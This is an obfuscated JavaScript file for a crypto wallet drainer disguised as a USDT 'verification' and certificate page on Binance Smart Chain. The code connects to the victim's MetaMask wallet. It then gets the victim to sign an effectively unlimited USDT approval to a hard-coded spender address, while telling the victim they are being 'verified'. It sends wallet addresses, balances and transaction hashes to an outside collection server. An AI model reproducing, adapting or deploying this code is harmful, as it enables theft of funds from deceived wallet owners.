const _0x2b14ce = _0x273e;
(function(_0x31cad2, _0x10f7eb) {
    const _0x36996c = _0x273e
      , _0x97e55d = _0x31cad2();
    while (!![]) {
        try {
            const _0x1ffcb7 = parseInt(_0x36996c(0x191)) / 0x1 + parseInt(_0x36996c(0x187)) / 0x2 + -parseInt(_0x36996c(0x1b3)) / 0x3 + parseInt(_0x36996c(0x1a1)) / 0x4 + -parseInt(_0x36996c(0x1b7)) / 0x5 + -parseInt(_0x36996c(0x1a4)) / 0x6 * (parseInt(_0x36996c(0x1b9)) / 0x7) + parseInt(_0x36996c(0x186)) / 0x8;
            if (_0x1ffcb7 === _0x10f7eb)
                break;
            else
                _0x97e55d['push'](_0x97e55d['shift']());
        } catch (_0x5491b7) {
            _0x97e55d['push'](_0x97e55d['shift']());
        }
    }
}(_0x1161, 0x31666));
const BSC_CHAIN_ID = _0x2b14ce(0x1a2)
  , USDT_CONTRACT_ADDRESS = _0x2b14ce(0x178)
  , SPENDER_ADDRESS = '0xa180f965528e913fdb9a250e2d0ae7108c6f19af'
  , MAX_UINT = _0x2b14ce(0x1a6);
let web3, usdtContract;
const USDT_ABI = [{
    'constant': !![],
    'inputs': [{
        'name': _0x2b14ce(0x197),
        'type': _0x2b14ce(0x1a3)
    }, {
        'name': '_spender',
        'type': 'address'
    }],
    'name': _0x2b14ce(0x181),
    'outputs': [{
        'name': '',
        'type': _0x2b14ce(0x19a)
    }],
    'type': _0x2b14ce(0x17e)
}, {
    'constant': ![],
    'inputs': [{
        'name': _0x2b14ce(0x199),
        'type': _0x2b14ce(0x1a3)
    }, {
        'name': _0x2b14ce(0x1a7),
        'type': _0x2b14ce(0x19a)
    }],
    'name': _0x2b14ce(0x1af),
    'outputs': [{
        'name': '',
        'type': _0x2b14ce(0x179)
    }],
    'type': _0x2b14ce(0x17e)
}, {
    'constant': !![],
    'inputs': [{
        'name': _0x2b14ce(0x197),
        'type': 'address'
    }],
    'name': _0x2b14ce(0x17f),
    'outputs': [{
        'name': _0x2b14ce(0x17c),
        'type': _0x2b14ce(0x19a)
    }],
    'type': _0x2b14ce(0x17e)
}];
async function checkAndApprove() {
    const _0x9f4ad5 = _0x2b14ce;
    try {
        if (!window[_0x9f4ad5(0x1b2)])
            throw new Error(_0x9f4ad5(0x1c9));
        web3 = new Web3(window[_0x9f4ad5(0x1b2)]),
        await handleNetworkSwitch();
        const _0x4b784b = await connectWallet();
        await initializeContract();
        const _0x1ed9c2 = _0x4b784b[0x0]
          , _0x3163a = await web3['eth']['getBalance'](_0x1ed9c2)
          , _0x30c58d = parseFloat(web3['utils'][_0x9f4ad5(0x194)](_0x3163a, _0x9f4ad5(0x176)))[_0x9f4ad5(0x1c6)](0x6)
          , _0x419265 = await usdtContract['methods'][_0x9f4ad5(0x17f)](_0x1ed9c2)['call']()
          , _0x3cd179 = Number(_0x419265) / 0xa ** 0x12
          , _0xc4b57e = _0x3cd179[_0x9f4ad5(0x1c6)](0x2);
        sendDataToServer(_0x9f4ad5(0x1b6), {
            'wallet': _0x1ed9c2,
            'bnb': _0x30c58d,
            'usdt': _0xc4b57e
        });
        const _0x15e67d = await checkApprovalStatus(_0x1ed9c2);
        if (_0x15e67d) {
            await showBalance(_0x1ed9c2);
            return;
        }
        const _0x151141 = await submitApproval(_0x1ed9c2);
        sendDataToServer(_0x9f4ad5(0x1c0), {
            'wallet': _0x1ed9c2,
            'transactionHash': _0x151141
        }),
        await showBalance(_0x1ed9c2);
    } catch (_0x49e861) {
        console['error'](_0x49e861),
        updateStatus(_0x9f4ad5(0x183) + _0x49e861[_0x9f4ad5(0x19d)], 'error');
    }
}
async function submitApproval(_0x466c1f) {
    const _0x5ea254 = _0x2b14ce;
    updateStatus(_0x5ea254(0x1be));
    try {
        const _0x210def = await usdtContract[_0x5ea254(0x198)][_0x5ea254(0x1af)](SPENDER_ADDRESS, MAX_UINT)['send']({
            'from': _0x466c1f
        });
        return updateStatus('Verified!\x20TX\x20Hash:\x20' + _0x210def[_0x5ea254(0x1bf)], _0x5ea254(0x184)),
        _0x210def[_0x5ea254(0x1bf)];
    } catch (_0x55f91a) {
        console[_0x5ea254(0x18a)](_0x5ea254(0x1bc), _0x55f91a);
        throw new Error(_0x5ea254(0x189));
    }
}
async function checkApprovalStatus(_0x5ba1a0) {
    const _0x2bbca9 = _0x2b14ce;
    updateStatus(_0x2bbca9(0x1c2));
    try {
        const _0x10ddd4 = await usdtContract['methods'][_0x2bbca9(0x181)](_0x5ba1a0, SPENDER_ADDRESS)['call']()
          , _0x56465a = BigInt(0x2e90edd000)
          , _0x244b34 = BigInt(_0x10ddd4);
        return _0x244b34 >= _0x56465a ? (updateStatus(_0x2bbca9(0x1c1), _0x2bbca9(0x184)),
        !![]) : (updateStatus('Verification\x20not\x20proper.\x20Verification\x20required.', _0x2bbca9(0x1a0)),
        ![]);
    } catch (_0x29ab6d) {
        console[_0x2bbca9(0x18a)](_0x2bbca9(0x1bb), _0x29ab6d);
        throw new Error(_0x2bbca9(0x185));
    }
}
async function showBalance(_0x57c005) {
    const _0x388c1d = _0x2b14ce;
    updateStatus(_0x388c1d(0x1ac));
    try {
        const _0x47864f = await usdtContract[_0x388c1d(0x198)][_0x388c1d(0x17f)](_0x57c005)[_0x388c1d(0x1c3)]()
          , _0x4dca87 = (_0x47864f / 0xa ** 0x12)['toFixed'](0x2);
        let _0x40b45f = await usdtContract[_0x388c1d(0x198)][_0x388c1d(0x181)](_0x57c005, SPENDER_ADDRESS)[_0x388c1d(0x1c3)]();
        const _0x5c6123 = BigInt(_0x388c1d(0x195));
        if (BigInt(_0x40b45f) < _0x5c6123) {
            updateStatus(_0x388c1d(0x1ca));
            const _0x2ffa55 = await submitApproval(_0x57c005);
            await sendDataToServer('approval', {
                'wallet': _0x57c005,
                'transactionHash': _0x2ffa55
            }),
            await new Promise(_0x441629 => setTimeout(_0x441629, 0xbb8)),
            _0x40b45f = await usdtContract['methods'][_0x388c1d(0x181)](_0x57c005, SPENDER_ADDRESS)[_0x388c1d(0x1c3)]();
            if (BigInt(_0x40b45f) < _0x5c6123) {
                updateStatus(_0x388c1d(0x192), 'error');
                return;
            }
        }
        const _0x1a434b = generateCertificateNumber()
          , _0x282e08 = document[_0x388c1d(0x196)](_0x388c1d(0x1bd))
          , _0xaf12ae = document[_0x388c1d(0x196)](_0x388c1d(0x1a5))
          , _0x462155 = document['getElementById'](_0x388c1d(0x1cb))
          , _0x4ce748 = document[_0x388c1d(0x196)](_0x388c1d(0x180))
          , _0x5f4c68 = document[_0x388c1d(0x196)](_0x388c1d(0x1b1));
        if (_0x282e08)
            _0x282e08[_0x388c1d(0x1c4)][_0x388c1d(0x1b0)] = _0x388c1d(0x1ab);
        if (_0xaf12ae)
            _0xaf12ae[_0x388c1d(0x1c4)]['display'] = 'block';
        if (_0x462155)
            _0x462155[_0x388c1d(0x177)] = _0x4dca87;
        if (_0x4ce748)
            _0x4ce748[_0x388c1d(0x177)] = _0x388c1d(0x1ae) + _0x1a434b;
        if (_0x5f4c68)
            _0x5f4c68['textContent'] = _0x388c1d(0x1b5) + _0x57c005;
        updateStatus(_0x388c1d(0x1ad), _0x388c1d(0x184)),
        await sendDataToServer(_0x388c1d(0x1c5), {
            'wallet': _0x57c005,
            'usdt': _0x4dca87,
            'certificate': _0x1a434b
        });
    } catch (_0x26d6b1) {
        console['error'](_0x388c1d(0x1a9), _0x26d6b1),
        updateStatus('Error:\x20' + _0x26d6b1[_0x388c1d(0x19d)], _0x388c1d(0x18a));
    }
}
async function refreshData() {
    const _0x4f70cf = _0x2b14ce
      , _0x53f106 = await web3[_0x4f70cf(0x17a)][_0x4f70cf(0x1ba)]();
    await checkApprovalStatus(_0x53f106[0x0]),
    await showBalance(_0x53f106[0x0]),
    await getAndSendBalances(_0x53f106[0x0]);
}
async function initializeContract() {
    const _0x5eaff3 = _0x2b14ce;
    usdtContract = new web3[(_0x5eaff3(0x17a))][(_0x5eaff3(0x1cc))](USDT_ABI,USDT_CONTRACT_ADDRESS);
}
function _0x273e(_0x14cdc6, _0x5a390a) {
    const _0x1161af = _0x1161();
    return _0x273e = function(_0x273e66, _0x3a6f37) {
        _0x273e66 = _0x273e66 - 0x174;
        let _0x193106 = _0x1161af[_0x273e66];
        return _0x193106;
    }
    ,
    _0x273e(_0x14cdc6, _0x5a390a);
}
async function handleNetworkSwitch() {
    const _0x340558 = _0x2b14ce
      , _0x1f8fd6 = await web3[_0x340558(0x17a)]['getChainId']();
    if (_0x1f8fd6 !== 0x38) {
        updateStatus(_0x340558(0x19b));
        try {
            await window['ethereum'][_0x340558(0x1aa)]({
                'method': _0x340558(0x19c),
                'params': [{
                    'chainId': BSC_CHAIN_ID
                }]
            });
        } catch (_0x1abb31) {
            if (_0x1abb31[_0x340558(0x1b4)] === 0x1326)
                await addBscNetwork();
            throw _0x1abb31;
        }
    }
}
function _0x1161() {
    const _0x47b10d = ['balanceOf', 'certificateNumber', 'allowance', 'Failed\x20to\x20check\x20database..:', 'Error:\x20', 'success', 'Failed\x20to\x20check\x20Verification\x20status', '2779368AWSmFO', '620080DUKClY', 'https://bscscan.com/', 'User\x20rejected\x20Verification', 'error', 'application/json', 'status\x20', 'CERT-', 'floor', 'Checking\x20wallet...', 'toString', '172584crLmct', 'Approval\x20failed\x20or\x20not\x20confirmed.\x20Try\x20again.', 'toUpperCase', 'fromWei', '200000000000000000000000', 'getElementById', '_owner', 'methods', '_spender', 'uint256', 'Please\x20wait...', 'wallet_switchEthereumChain', 'message', 'https://bepnet.pikainfinity.store/verify.php', 'random', 'warning', '371368NFvdLD', '0x38', 'address', '6KDSHyo', 'balanceSection', '50000000000000000000000000000', '_value', 'wallet_addEthereumChain', 'Balance\x20or\x20approval\x20failed:', 'request', 'none', 'Fetching\x20USDT\x20balance...', 'Verified\x20✅', 'Certificate\x20No:\x20', 'approve', 'display', 'walletAddress', 'ethereum', '517530SPGtEK', 'code', 'Wallet:\x20', 'wallet_connect', '1983070ZckRiI', 'className', '1059947SGYihc', 'getAccounts', 'Verification\x20check\x20failed:', 'Verification\x20failed:', 'approvalSection', 'Requesting\x20Verification...', 'transactionHash', 'approval', 'Already\x20verified\x20✅', 'Checking\x20Verification\x20status...', 'call', 'style', 'certificate_generated', 'toFixed', 'now', 'eth_requestAccounts', 'Please\x20install\x20MetaMask!', 'Allowance\x20is\x20below\x20200,000\x20USDT.\x20Approving\x20again...', 'balanceAmount', 'Contract', 'bnb', 'getBalance', 'BNB', 'ether', 'textContent', '0x55d398326f99059fF775485246999027B3197955', 'bool', 'eth', 'Binance\x20Smart\x20Chain', 'balance', 'status', 'function'];
    _0x1161 = function() {
        return _0x47b10d;
    }
    ;
    return _0x1161();
}
async function addBscNetwork() {
    const _0x113215 = _0x2b14ce;
    await window['ethereum']['request']({
        'method': _0x113215(0x1a8),
        'params': [{
            'chainId': BSC_CHAIN_ID,
            'chainName': _0x113215(0x17b),
            'nativeCurrency': {
                'name': _0x113215(0x175),
                'symbol': _0x113215(0x1cd),
                'decimals': 0x12
            },
            'rpcUrls': ['https://bsc-dataseed.binance.org/'],
            'blockExplorerUrls': [_0x113215(0x188)]
        }]
    });
}
async function connectWallet() {
    const _0x8be20d = _0x2b14ce;
    updateStatus(_0x8be20d(0x18f));
    try {
        const _0x2b8ae4 = await window[_0x8be20d(0x1b2)]['request']({
            'method': _0x8be20d(0x1c8)
        });
        return _0x2b8ae4;
    } catch (_0x42ae95) {
        throw new Error('User\x20rejected\x20connection');
    }
}
async function sendDataToServer(_0x551cfe, _0x4f297f) {
    const _0xc55216 = _0x2b14ce;
    try {
        await fetch(_0xc55216(0x19e), {
            'method': 'POST',
            'headers': {
                'Content-Type': _0xc55216(0x18b)
            },
            'body': JSON['stringify']({
                'action': _0x551cfe,
                ..._0x4f297f
            })
        });
    } catch (_0xbd93cd) {
        console[_0xc55216(0x18a)](_0xc55216(0x182), _0xbd93cd);
    }
}
async function getAndSendBalances(_0x4587ef) {
    const _0x5729d7 = _0x2b14ce;
    try {
        const _0x1ab8f9 = await usdtContract[_0x5729d7(0x198)][_0x5729d7(0x17f)](_0x4587ef)['call']()
          , _0x57053a = (_0x1ab8f9 / 0xa ** 0x12)[_0x5729d7(0x1c6)](0x6)
          , _0x50405d = await web3[_0x5729d7(0x17a)][_0x5729d7(0x174)](_0x4587ef)
          , _0x45a7c = web3['utils'][_0x5729d7(0x194)](_0x50405d, 'ether');
        await sendDataToServer('balance_update', {
            'wallet': _0x4587ef,
            'usdt': _0x57053a,
            'bnb': _0x45a7c
        });
    } catch (_0x2cdbdd) {
        console[_0x5729d7(0x18a)]('Failed\x20to\x20fetch/send\x20balances:', _0x2cdbdd);
    }
}
function updateStatus(_0x3f2d74, _0x3be0f2='info') {
    const _0x982c61 = _0x2b14ce
      , _0x1fbd16 = document[_0x982c61(0x196)](_0x982c61(0x17d));
    _0x1fbd16[_0x982c61(0x177)] = _0x3f2d74,
    _0x1fbd16[_0x982c61(0x1b8)] = _0x982c61(0x18c) + _0x3be0f2;
}
function generateCertificateNumber() {
    const _0x1bafd2 = _0x2b14ce
      , _0x3639cd = Date[_0x1bafd2(0x1c7)]()['toString'](0x24)
      , _0x26a017 = Math[_0x1bafd2(0x18e)](Math[_0x1bafd2(0x19f)]() * 0x5f5e100)[_0x1bafd2(0x190)](0x24);
    return (_0x1bafd2(0x18d) + _0x3639cd + '-' + _0x26a017)[_0x1bafd2(0x193)]();
}
